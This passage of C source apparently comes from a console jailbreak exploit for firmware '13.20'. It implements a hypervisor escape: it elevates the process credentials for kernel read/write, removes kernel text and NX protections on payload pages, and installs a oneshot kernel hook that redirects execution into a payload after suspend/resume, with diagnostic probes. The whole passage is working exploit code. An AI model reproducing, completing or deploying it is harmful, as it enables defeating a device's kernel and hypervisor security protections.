  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;
  kh_set_hook_target(&hook, hook_kaddr);
  kh_set_resume_rax(&hook, 0x12345678);

  if (mode == 1)
    kh_set_resume_rip(&hook, hook_kaddr + 7);   /* redirect within .text   */
  if (mode == 2) {
    kh_set_resume_rip(&hook, payload_va);       /* redirect into the blob  */
    kh_set_resume_rdi(&hook, ktext);
    kh_set_resume_rsi(&hook, kdldmap(0));
    kh_set_resume_rdx(&hook, hook_kaddr + 7);   /* blob returns here       */
    kh_set_resume_rax(&hook, 0);                /* blob stage 0: just return */
  }
  if (mode == 3)
    kh_set_resume_rip(&hook, payload_va);       /* land on the tail bytes  */

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  if (kh_install(&hook, &chain)) {
    notify("13.20: probe%d kh_install failed\n", (int)mode);
    return -1;
  }
  kh_trigger(&hook);
  notify("13.20: probe%d firing getuid...\n", (int)mode);
  long r = syscall(SYS_getuid);
  notify("13.20: probe%d getuid returned %#lx\n", (int)mode, (unsigned long)r);

  kh_disarm(&hook);
  kh_restore(&hook);
  return 0;
}
#endif /* PL5_PROBE */

int hv_defeat_1320(void *shellcode_kernel, size_t shellcode_kernel_len) {
  uint64_t cave_addr;
#if PL5_DIAG >= 1
  uint64_t kernel_pmap;
  int ret;
#endif

  /* shellcode_kernel is a legacy (ACPI-ROP) artifact; the 13.20 vector stages
   * its own shellcode_hv from post_resume() and ignores it. */
  (void)shellcode_kernel;
  (void)shellcode_kernel_len;

  if (check_offsets()) {
    notify("13.20: high-FW vector is not ready (offsets incomplete).\n");
    return -1;
  }

  notify("13.20: diagnostic stage PL5_DIAG=%d\n", PL5_DIAG);

  /* Kernel memory R/W without tripping the guest permission checks. */
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);

  cave_addr = kdlsym(KERNEL_SYM_DATA_CAVE);
#if PL5_DIAG >= 1
  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
#endif

  if (kread64(cave_addr + CAVE_STATE_OFF) == STATE_ARMED) {
    notify("13.20: hook already armed (state survived).\n");
    return 0;
  }

#if PL5_DIAG == 0
  /* Stage 0: pure S3 round-trip. Arm nothing; just prove the payload process
   * survives suspend/resume (post_resume prints [W] and returns). */
  notify("13.20: diag=0: no escape, no hook; entering rest mode.\n");
  g_armed = 0;
  kwrite64(cave_addr + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
#else
  notify("13.20: running khook self-test...\n");
  if (khook_selftest())
    notify("13.20: khook self-test FAILED (arm path may be broken).\n");
  else
    notify("13.20: khook self-test passed.\n");

  notify("13.20: escaping hypervisor (Byepervisor khook)...\n");

#if PL5_DIAG >= 4
  notify("13.20: payload-exec NX BEFORE (kernel=%#lx proc=%#lx va=%#lx):\n",
         (unsigned long)kernel_pmap, (unsigned long)get_proc_pmap(),
         (unsigned long)kdldmap(STARTUP_MP_PAYLOAD_PAGE));
  log_payload_nx(kernel_pmap, "kern");
  log_payload_nx(get_proc_pmap(), "proc");
#endif

  escape_kernel_text(kernel_pmap);
  map_payload_executable(kernel_pmap);
  /* The resume hook fires from the payload *process* (getuid syscall), so the
   * page tables active then are the process pmap's. Clearing NX only in
   * kernel_pmap leaves the dmap alias non-executable in the process pmap -- the
   * exact fault probe3 hit. Clear it there too. */
  map_payload_executable(get_proc_pmap());

#if PL5_DIAG >= 4
  notify("13.20: payload-exec NX AFTER:\n");
  log_payload_nx(kernel_pmap, "kern");
  log_payload_nx(get_proc_pmap(), "proc");
#endif

#if PL5_PROBE
  /* Pre-rest-mode resume_rip probe. NOTE: this cannot validate redirects into
   * the dmap payload page -- editing the page tables with kwrite64 does not
   * invalidate the TLB, so the stale non-executable translation persists until
   * a resume flushes it. The real flow (post-resume) is the true test. */
  notify("13.20: redirect probe [0]=base [1]=ktext [3]=page-exec [2]=blob...\n");
  if (takeover_return_selftest(0))
    notify("13.20: probe0 baseline FAILED early.\n");
  if (takeover_return_selftest(1))
    notify("13.20: probe1 ktext FAILED early.\n");
  if (takeover_return_selftest(3))
    notify("13.20: probe3 page-exec FAILED early.\n");
  if (takeover_return_selftest(2))
    notify("13.20: probe2 blob FAILED early.\n");
  notify("13.20: redirect probes all completed.\n");
#endif

  /* NOTE: stage_hv_boot() is intentionally NOT called here. Byepervisor's arm
   * path does not touch the 4 GiB cave before sleeping; the ~64 MB write is a
   * candidate for the wake crash and is redundant because post_resume() re-stages
   * everything anyway. */

  /* Stages 1-3 install the same oneshot hook; only the RSI redirect (and hence
   * whether break_hv actually runs) differs. */
  ret = install_resume_hook(cave_addr, PL5_DIAG >= 2);
  if (ret) {
    notify("13.20: hook install failed (khook rc=%d).\n", ret);
    return -1;
  }

  notify("13.20: hypervisor escape armed (diag=%d). Rest mode -> payload.\n",
         PL5_DIAG);
  return 0;
#endif
}
